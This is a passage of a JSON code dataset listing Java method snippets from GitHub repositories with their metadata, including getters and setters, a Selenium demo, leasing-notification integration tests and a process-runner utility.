"https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/movies/Quality.java", "stars": "4", "class_props": {"extends": "butter", "implements": null, "modifiers": ["public"]}}, {"id": 57027, "method_name": "getPeers", "class_name": "Quality", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getPeers() {\n        return super.getPeers();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/movies/Quality.java", "stars": "4", "class_props": {"extends": "butter", "implements": null, "modifiers": ["public"]}}, {"id": 57028, "method_name": "setPeers", "class_name": "Quality", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPeers(int peers) {\n        super.setPeers(peers);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/movies/Quality.java", "stars": "4", "class_props": {"extends": "butter", "implements": null, "modifiers": ["public"]}}, {"id": 57029, "method_name": "getSeeds", "class_name": "Quality", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getSeeds() {\n        return super.getSeeds();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/movies/Quality.java", "stars": "4", "class_props": {"extends": "butter", "implements": null, "modifiers": ["public"]}}, {"id": 57030, "method_name": "setSeeds", "class_name": "Quality", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSeeds(int seeds) {\n        super.setSeeds(seeds);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/media/response/models/movies/Quality.java", "stars": "4", "class_props": {"extends": "butter", "implements": null, "modifiers": ["public"]}}, {"id": 57031, "method_name": "addTrait", "class_name": "Genes", "params": ["Trait"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addTrait(Trait t) {\n        if (traits.size() > GENE_LENGTH)\n            traits.remove(0);\n        traits.add(t);\n    }", "url": "https://raw.githubusercontent.com/AndreaRiboni/Garden/master/src/flower_logic/Genes.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57032, "method_name": "addTraits", "class_name": "Genes", "params": ["ArrayList<Trait>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addTraits(ArrayList<Trait> traits){\n        traits.forEach((t) -> {\n            addTrait(t);\n        });\n    }", "url": "https://raw.githubusercontent.com/AndreaRiboni/Garden/master/src/flower_logic/Genes.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57033, "method_name": "getTraits", "class_name": "Genes", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ArrayList<Trait>", "snippet": "    public ArrayList<Trait> getTraits(){\n        return traits;\n    }", "url": "https://raw.githubusercontent.com/AndreaRiboni/Garden/master/src/flower_logic/Genes.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57034, "method_name": "main", "class_name": "WebElementCommands", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\n\t\tSystem.setProperty(ChromeDriverService.CHROME_DRIVER_SILENT_OUTPUT_PROPERTY, \"true\");\n\n\t\t// System.setProperty(\"webdriver.chrome.silentOutput\", \"true\");\n\n\t\tSystem.setProperty(\"webdriver.chrome.driver\", \"drivers/chromedriver.exe\");\n\t\tWebDriver driver = new ChromeDriver();\n\t\tString url = \"https://opensource-demo.orangehrmlive.com/index.php/auth/login\";\n\n\t\tdriver.get(url);\n\n\t\t// sendKeys()\n\n\t\tWebElement userName= driver.findElement(By.id(\"txtUsername\"));\n\t\tuserName.sendKeys(\"Admin\");\n\n\t\t// clear()\n\t\tuserName.clear();\n\t\tuserName.sendKeys(\"Hello\");\n\n\t\t// isDisplayed()\n\n//\t\tboolean loginBtnDisp = driver.findElement(By.id(\"btnLogin\")).isDisplayed();\n//\t\tSystem.out.println(loginBtnDisp);\n\n\t\t// isEnabled()\n\t\t\n//\t\tboolean loginBtnenabled = driver.findElement(By.id(\"btnLogin\")).isEnabled();\n//\t\tSystem.out.println(loginBtnenabled);\n//\t\t\n//\t\t// isSelected()\n//\t\t\n//\t\tboolean loginBtnSelected= driver.findElement(By.id(\"btnLogin\")).isSelected();\n//\t\tSystem.out.println(loginBtnSelected);\n\t\t\n\t\t// getText() visible text\n\t\t\n\t\t\n\t\tdriver.findElement(By.id(\"btnLogin\")).click();\n\t\tString errorMsg= driver.findElement(By.id(\"spanMessage\")).getText();\n\t\tSystem.out.println(errorMsg);\n\t\t\n\t\tif(errorMsg.equalsIgnoreCase(\"Vous devez remplir le champ Mot de passe\")) {\n\t\t\tSystem.out.println(\"Correct message displayed\");\n\t\t}else {\n\t\t\tSystem.out.println(\"Wrong message displayed\");\n\t\t}\n\t\t\n\t\t// getAttribute() \n\t\t\n\t\tString loginValue= driver.findElement(By.id(\"btnLogin\")).getAttribute(\"value\");\n\t\t\n\t\tSystem.out.println(loginValue);\n\t\t\n\t\t//FindElement vs FindElements\n\t\t//radio button- check box\n\t\t//drop downs\n\t\t//webtable\n\t\t\n\t\t// submit()\n\t\t\n\t\t\n\t\t\n\t\t\n\t\t\n\t\t\n\t}", "url": "https://raw.githubusercontent.com/fadimedibi/SeleniumTurkish/master/src/com/class3/WebElementCommands.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57035, "method_name": "saveUser", "class_name": "MessageServiceIT", "params": ["String", "String", "String", "String"], "throws": null, "modifiers": ["private"], "return_type": "User", "snippet": "    private User saveUser(String login, String fName, String lName, String email) {\n        User user = new User();\n        user.setLogin(login);\n        user.setPassword(RandomStringUtils.random(60));\n        user.setActivated(true);\n        user.setBankAccountIBAN(DEFAULT_IBAN);\n        user.setFirstName(fName);\n        user.setLastName(lName);\n        user.setEmail(email);\n\n        return userRepository.saveAndFlush(user);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MessageServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57036, "method_name": "init", "class_name": "MessageServiceIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() {\n        owner = saveUser(DEFAULT_LOGIN, DEFAULT_FIRSTNAME, DEFAULT_LASTNAME, DEFAULT_EMAIL);\n        requester = saveUser(USER2_LOGIN, \"Randy\", \"Marsh\", \"rm@sp.com\");\n        user3 = saveUser(USER3_LOGIN, \"Towel\", \"Wet\", \"twl@tegr.com\");\n\n        gardenField = new GardenField();\n        gardenField.setName(GARDEN_NAME);\n        gardenField.setSizeInM2(SIZE_IN_M2);\n        gardenField.setPricePerM2(PRICE_PER_M2);\n        gardenField.setLatitude(LATITUDE);\n        gardenField.setLongitude(LONGITUDE);\n        gardenField.setCity(CITY);\n        gardenField.setRoofed(ROOFED);\n        gardenField.setGlassHouse(GLASS_HOUSE);\n        gardenField.setHigh(HIGH);\n        gardenField.setWater(WATER);\n        gardenField.setElectricity(ELECTRICITY);\n        gardenField.setPhValue(PH_VALUE);\n        gardenField.setOwner(owner);\n        gardenFieldRepository.saveAndFlush(gardenField);\n\n        leasing = new Leasing()\n            .from(DEFAULT_FROM)\n            .to(DEFAULT_TO)\n            .gardenField(gardenField)\n            .paymentSessionId(\"test\")\n            .user(requester);\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MessageServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57037, "method_name": "getMessageCountForUser", "class_name": "MessageServiceIT", "params": ["User"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "    private int getMessageCountForUser(User user) {\n        return (int) messageRepository.findAll().stream()\n            .filter(notif -> notif.getUserTo().getId().equals(user.getId())).count();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MessageServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57038, "method_name": "testCreateOpenLeasingNotification", "class_name": "MessageServiceIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testCreateOpenLeasingNotification() {\n        int messagesForOwnerBeforeCreation = getMessageCountForUser(owner);\n        int messagesForRequesterBeforeCreation = getMessageCountForUser(requester);\n\n        leasing.setStatus(LeasingStatus.OPEN);\n        leasingRepository.saveAndFlush(leasing);\n\n        MessageDTO notifDTO = messageService.createLeasingNotification(leasing);\n\n        int messagesForOwnerAfterCreation = getMessageCountForUser(owner);\n        int messagesForRequesterAfterCreation = getMessageCountForUser(requester);\n\n        assertThat(messagesForOwnerAfterCreation).isEqualTo(messagesForOwnerBeforeCreation + 1);\n        assertThat(messagesForRequesterAfterCreation).isEqualTo(messagesForRequesterBeforeCreation);\n        assertThat(notifDTO.getType()).isEqualByComparingTo(MessageType.SYSTEM_LEASING_OPEN);\n        assertThat(notifDTO.getOpened()).isFalse();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MessageServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57039, "method_name": "testCreateReservedLeasingNotification", "class_name": "MessageServiceIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testCreateReservedLeasingNotification() {\n        int messagesForOwnerBeforeCreation = getMessageCountForUser(owner);\n        int messagesForRequesterBeforeCreation = getMessageCountForUser(requester);\n\n        leasing.setStatus(LeasingStatus.RESERVED);\n        leasingRepository.saveAndFlush(leasing);\n\n        MessageDTO notifDTO = messageService.createLeasingNotification(leasing);\n\n        int messagesForOwnerAfterCreation = getMessageCountForUser(owner);\n        int messagesForRequesterAfterCreation = getMessageCountForUser(requester);\n\n        assertThat(messagesForOwnerAfterCreation).isEqualTo(messagesForOwnerBeforeCreation);\n        assertThat(messagesForRequesterAfterCreation).isEqualTo(messagesForRequesterBeforeCreation + 1);\n        assertThat(notifDTO.getType()).isEqualByComparingTo(MessageType.SYSTEM_LEASING_RESERVED);\n        assertThat(notifDTO.getOpened()).isFalse();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MessageServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57040, "method_name": "testCreateRejectedLeasingNotification", "class_name": "MessageServiceIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testCreateRejectedLeasingNotification() {\n        int messagesForOwnerBeforeCreation = getMessageCountForUser(owner);\n        int messagesForRequesterBeforeCreation = getMessageCountForUser(requester);\n\n        leasing.setStatus(LeasingStatus.REJECTED);\n        leasingRepository.saveAndFlush(leasing);\n\n        MessageDTO notifDTO = messageService.createLeasingNotification(leasing);\n\n        int messagesForOwnerAfterCreation = getMessageCountForUser(owner);\n        int messagesForRequesterAfterCreation = getMessageCountForUser(requester);\n\n        assertThat(messagesForOwnerAfterCreation).isEqualTo(messagesForOwnerBeforeCreation);\n        assertThat(messagesForRequesterAfterCreation).isEqualTo(messagesForRequesterBeforeCreation + 1);\n        assertThat(notifDTO.getType()).isEqualByComparingTo(MessageType.SYSTEM_LEASING_REJECTED);\n        assertThat(notifDTO.getOpened()).isFalse();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MessageServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57041, "method_name": "testCreateCancelledLeasingNotification", "class_name": "MessageServiceIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testCreateCancelledLeasingNotification() {\n        int messagesForOwnerBeforeCreation = getMessageCountForUser(owner);\n        int messagesForRequesterBeforeCreation = getMessageCountForUser(requester);\n\n        leasing.setStatus(LeasingStatus.CANCELLED);\n        leasingRepository.saveAndFlush(leasing);\n\n        MessageDTO notifDTO = messageService.createLeasingNotification(leasing);\n\n        int messagesForOwnerAfterCreation = getMessageCountForUser(owner);\n        int messagesForRequesterAfterCreation = getMessageCountForUser(requester);\n\n        assertThat(messagesForOwnerAfterCreation).isEqualTo(messagesForOwnerBeforeCreation + 1);\n        assertThat(messagesForRequesterAfterCreation).isEqualTo(messagesForRequesterBeforeCreation);\n        assertThat(notifDTO.getType()).isEqualByComparingTo(MessageType.SYSTEM_LEASING_CANCELLED);\n        assertThat(notifDTO.getOpened()).isFalse();\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MessageServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57042, "method_name": "testSameThreadInTwoNotifications", "class_name": "MessageServiceIT", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testSameThreadInTwoNotifications() {\n        int messagesForOwnerBeforeCreation = getMessageCountForUser(owner);\n        int messagesForRequesterBeforeCreation = getMessageCountForUser(requester);\n\n        leasing.setStatus(LeasingStatus.CANCELLED);\n        leasingRepository.saveAndFlush(leasing);\n        MessageDTO notifDTO = messageService.createLeasingNotification(leasing);\n\n        leasing.setStatus(LeasingStatus.RESERVED);\n        leasingRepository.saveAndFlush(leasing);\n        MessageDTO notif2DTO = messageService.createLeasingNotification(leasing);\n\n        int messagesForOwnerAfterCreation = getMessageCountForUser(owner);\n        int messagesForRequesterAfterCreation = getMessageCountForUser(requester);\n\n        assertThat(messagesForOwnerAfterCreation).isEqualTo(messagesForOwnerBeforeCreation + 1);\n        assertThat(messagesForRequesterAfterCreation).isEqualTo(messagesForRequesterBeforeCreation +1);\n        assertThat(notifDTO.getThread()).isEqualByComparingTo(notif2DTO.getThread());\n    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/MessageServiceIT.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57043, "method_name": "run", "class_name": "RuntimeRunner", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void run() throws Exception {\n        log.info(\"Running: \" + Lists.newArrayList(commands));\n        Process proc = Runtime.getRuntime().exec(commands);\n        new StreamGobbler(proc.getErrorStream(), Level.ERROR).start();\n        new StreamGobbler(proc.getInputStream(), Level.INFO).start();\n        proc.waitFor();\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgerp/util/RuntimeRunner.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57044, "method_name": "run", "class_name": "StreamGobbler", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void run() {\n            try {\n                InputStreamReader isr = new InputStreamReader(is);\n                BufferedReader br = new BufferedReader(isr);\n                String line = null;\n                while ((line = br.readLine()) != null)\n                    log.log(logLevel, line);\n            } catch (IOException ioe) {\n                log.error(ioe);\n            }\n        }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgerp/util/RuntimeRunner.java", "stars": "12", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["static", "private"]}}, {"id": 57045, "method_name": "getInstance", "class_name": "Config", "params": ["Context"], "throws": null, "modifiers": ["synchronized", "public", "static"], "return_type": "Config", "snippet": "    public static synchronized Config getInstance(Context context) {\n        if (instance == null) {\n            instance = new Config(context);\n        }\n        return instance;\n    }", "url": "https://raw.githubusercontent.com/wix-incubator/rn-contact-tracing/master/lib/android/src/main/java/com/wix/specialble/config/Config.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57046, "method_name": "setScanDuration", "class_name": "Config", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setScanDuration(long scanDuration) {\n        sharedPrefs.edit().putLong(PREF_SCAN_DURATION, scanDuration).apply();\n    }", "url": "https://raw.githubusercontent.com/wix-incubator/rn-contact-tracing/master/lib/android/src/main/java/com/wix/specialble/config/Config.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57047, "method_name": "getScanDuration", "class_name": "Config", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getScanDuration() {\n        return sharedPrefs.getLong(PREF_SCAN_DURATION, DEFAULT_SCAN_DURATION);\n    }", "url": "https://raw.githubusercontent.com/wix-incubator/rn-contact-tracing/master/lib/android/src/main/java/com/wix/specialble/config/Config.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57048, "method_name": "setScanInterval", "class_name": "Config", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setScanInterval(long scanInterval) {\n        sharedPrefs.edit().putLong(PREF_SCAN_INTERVAL, scanInterval).apply();\n    }", "url": "https://raw.githubusercontent.com/wix-incubator/rn-contact-tracing/master/lib/android/src/main/java/com/wix/specialble/config/Config.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57049, "method_name": "getScanInterval", "class_name": "Config", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getScanInterval() {\n        return sharedPrefs.getLong(PREF_SCAN_INTERVAL, DEFAULT_SCAN_INTERVAL);\n    }", "url": "https://raw.githubusercontent.com/wix-incubator/rn-contact-tracing/master/lib/android/src/main/java/com/wix/specialble/config/Config.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57050, "method_name": "setAdvertiseInterval", "class_name": "Config", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAdvertiseInterval(long scanInterval) {\n        sharedPrefs.edit().putLong(PREF_ADVERTISE_INTERVAL, scanInterval).apply();\n    }", "url": "https://raw.githubusercontent.com/wix-incubator/rn-contact-tracing/master/lib/android/src/main/java/com/wix/specialble/config/Config.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57051, "method_name": "getAdvertiseInterval", "class_name": "Config", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getAdvertiseInterval() {\n        return sharedPrefs.getLong(PREF_ADVERTISE_INTERVAL, DEFAULT_ADVERTISE_INTERVAL);\n    }", "url": "https://raw.githubusercontent.com/wix-incubator/rn-contact-tracing/master/lib/android/src/main/java/com/wix/specialble/config/Config.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57052, "method_name": "setAdvertiseDuraton", "class_name": "Config", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAdvertiseDuraton(long scanInterval) {\n        sharedPrefs.edit().putLong(PREF_ADVERTISE_DURATION, scanInterval).apply();\n    }", "url": "https://raw.githubusercontent.com/wix-incubator/rn-contact-tracing/master/lib/android/src/main/java/com/wix/specialble/config/Config.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57053, "method_name": "getAdvertiseDuration", "class_name": "Config", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getAdvertiseDuration() {\n        return sharedPrefs.getLong(PREF_ADVERTISE_DURATION, DEFAULT_ADVERTISE_DURATION);\n    }", "url": "https://raw.githubusercontent.com/wix-incubator/rn-contact-tracing/master/lib/android/src/main/java/com/wix/specialble/config/Config.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57054, "method_name": "setAdvertiseTXPowerLevel", "class_name": "Config", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAdvertiseTXPowerLevel(int powerLevel) {\n        sharedPrefs.edit().putInt(PREF_ADVERTISE_TX_POWER_LEVEL, powerLevel).apply();\n    }", "url": "https://raw.githubusercontent.com/wix-incubator/rn-contact-tracing/master/lib/android/src/main/java/com/wix/specialble/config/Config.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57055, "method_name": "getAdvertiseTXPowerLevel", "class_name": "Config", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getAdvertiseTXPowerLevel() {\n        return sharedPrefs.getInt(PREF_ADVERTISE_TX_POWER_LEVEL, DEFAULT_ADVERTISE_TX_POWER_LEVEL);\n    }", "url": "https://raw.githubusercontent.com/wix-incubator/rn-contact-tracing/master/lib/android/src/main/java/com/wix/specialble/config/Config.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57056, "method_name": "setAdvertiseMode", "class_name": "Config", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAdvertiseMode(int advertiseMode) {\n        sharedPrefs.edit().putInt(PREF_ADVERTISE_MODE, advertiseMode).apply();\n    }", "url": "https://raw.githubusercontent.com/wix-incubator/rn-contact-tracing/master/lib/android/src/main/java/com/wix/specialble/config/Config.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57057, "method_name": "getAdvertiseMode", "class_name": "Config", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getAdvertiseMode() {\n        return sharedPrefs.getInt(PREF_ADVERTISE_MODE, DEFAULT_ADVERTISE_MODE);\n    }", "url": "https://raw.githubusercontent.com/wix-incubator/rn-contact-tracing/master/lib/android/src/main/java/com/wix/specialble/config/Config.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57058, "method_name": "setScanMode", "class_name": "Config", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setScanMode(int scanMode) {\n        sharedPrefs.edit().putInt(PREF_ADVERTISE_MODE, scanMode).apply();\n    }", "url": "https://raw.githubusercontent.com/wix-incubator/rn-contact-tracing/master/lib/android/src/main/java/com/wix/specialble/config/Config.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57059, "method_name": "getScanMode", "class_name": "Config", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getScanMode() {\n        return sharedPrefs.getInt(PREF_SCAN_MODE, DEFAULT_SCAN_MODE);\n    }", "url": "https://raw.githubusercontent.com/wix-incubator/rn-contact-tracing/master/lib/android/src/main/java/com/wix/specialble/config/Config.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57060, "method_name": "setServiceUUID", "class_name": "Config", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setServiceUUID(String serviceUUID) {\n        sharedPrefs.edit().putString(PREF_SERVICEUUID, serviceUUID).apply();\n    }", "url": "https://raw.githubusercontent.com/wix-incubator/rn-contact-tracing/master/lib/android/src/main/java/com/wix/specialble/config/Config.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57061, "method_name": "getServiceUUID", "class_name": "Config", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getServiceUUID() {\n        return sharedPrefs.getString(PREF_SERVICEUUID, DEFAULT_SERVICEUUID);\n    }", "url": "https://raw.githubusercontent.com/wix-incubator/rn-contact-tracing/master/lib/android/src/main/java/com/wix/specialble/config/Config.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57062, "method_name": "setToken", "class_name": "Config", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setToken(String token) {\n        sharedPrefs.edit().putString(PREF_TOKEN, token).apply();\n    }", "url": "https://raw.githubusercontent.com/wix-incubator/rn-contact-tracing/master/lib/android/src/main/java/com/wix/specialble/config/Config.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57063, "method_name": "getToken", "class_name": "Config", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getToken() {\n        return sharedPrefs.getString(PREF_TOKEN, DEFAULT_TOKEN);\n    }", "url": "https://raw.githubusercontent.com/wix-incubator/rn-contact-tracing/master/lib/android/src/main/java/com/wix/specialble/config/Config.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57064, "method_name": "setScanMatchMode", "class_name": "Config", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setScanMatchMode(int scanMatchMode) {\n        sharedPrefs.edit().putInt(PREF_SCAN_MATCH_MODE, scanMatchMode).apply();\n    }", "url": "https://raw.githubusercontent.com/wix-incubator/rn-contact-tracing/master/lib/android/src/main/java/com/wix/specialble/config/Config.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57065, "method_name": "getScanMatchMode", "class_name": "Config", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getScanMatchMode() {\n        return sharedPrefs.getInt(PREF_SCAN_MATCH_MODE, DEFAULT_SCAN_MATCH_MODE);\n    }", "url": "https://raw.githubusercontent.com/wix-incubator/rn-contact-tracing/master/lib/android/src/main/java/com/wix/specialble/config/Config.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57066, "method_name": "setNotificationTitle", "class_name": "Config", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setNotificationTitle(String title) {\n        sharedPrefs.edit().putString(PREF_NOTIFICATION_TITLE, title).apply();\n    }", "url": "https://raw.githubusercontent.com/wix-incubator/rn-contact-tracing/master/lib/android/src/main/java/com/wix/specialble/config/Config.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57067, "method_name": "getNotificationTitle", "class_name": "Config", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getNotificationTitle() {\n        return sharedPrefs.getString(PREF_NOTIFICATION_TITLE, DEFAULT_NOTIFICATION_TITLE);\n    }", "url": "https://raw.githubusercontent.com/wix-incubator/rn-contact-tracing/master/lib/android/src/main/java/com/wix/specialble/config/Config.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57068, "method_name": "setNotificationContent", "class_name": "Config", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setNotificationContent(String content) {\n        sharedPrefs.edit().putString(PREF_NOTIFICATION_CONTENT, content).apply();\n    }", "url": "https://raw.githubusercontent.com/wix-incubator/rn-contact-tracing/master/lib/android/src/main/java/com/wix/specialble/config/Config.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57069, "method_name": "getNotificationContent", "class_name": "Config", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getNotificationContent() {\n        return sharedPrefs.getString(PREF_NOTIFICATION_CONTENT, DEFAULT_NOTIFICATION_CONTENT);\n    }", "url": "https://raw.githubusercontent.com/wix-incubator/rn-contact-tracing/master/lib/android/src/main/java/com/wix/specialble/config/Config.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57070, "method_name": "getMarcaAutomovil", "class_name": "Automovil", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMarcaAutomovil() {\n        return marca;\n    }", "url": "https://raw.githubusercontent.com/EduarAlexis/SOLID/master/src/main/java/Solid/S/Automovil.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57071, "method_name": "onDraw", "class_name": "Practice13ShadowLayerView", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {\n        super.onDraw(canvas);\n\n        paint.setTextSize(120);\n        canvas.drawText(\"Hello Geekholt\", 50, 200, paint);\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson2/Practice13ShadowLayerView.java", "stars": "2", "class_props": {"extends": "View", "implements": null, "modifiers": ["public"]}}, {"id": 57072, "method_name": "onCreate", "class_name": "OrderHistory", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_fragment_container);\n        ButterKnife.bind(this);\n\n\n\n        boolean filterByUserID = false;\n        boolean filterByShopID = false;\n\n\n        if(getIntent().getBooleanExtra(OrderHistory.IS_FILTER_BY_SHOP,false))\n        {\n            filterByShopID = true;\n        }\n\n\n\n        if (getSupportFragmentManager().findFragmentByTag(\"order_history_fragment\") == null) {\n            getSupportFragmentManager()\n                    .beginTransaction()\n                    .replace(R.id.fragment_container,\n                            OrdersHistoryFragment.newInstance(false,filterByShopID,false),\n                            \"order_history_fragment\")\n                    .commit();\n        }\n\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Lists/OrderHistory/OrderHistory.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 57073, "method_name": "onCreateOptionsMenu", "class_name": "OrderHistory", "params": ["Menu"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onCreateOptionsMenu(Menu menu) {\n        super.onCreateOptionsMenu(menu);\n        MenuInflater inflater = getMenuInflater();\n        inflater.inflate(R.menu.menu_order_history_new, menu);\n\n\n        // Associate searchable configuration with the SearchView\n        SearchView searchView = (SearchView) 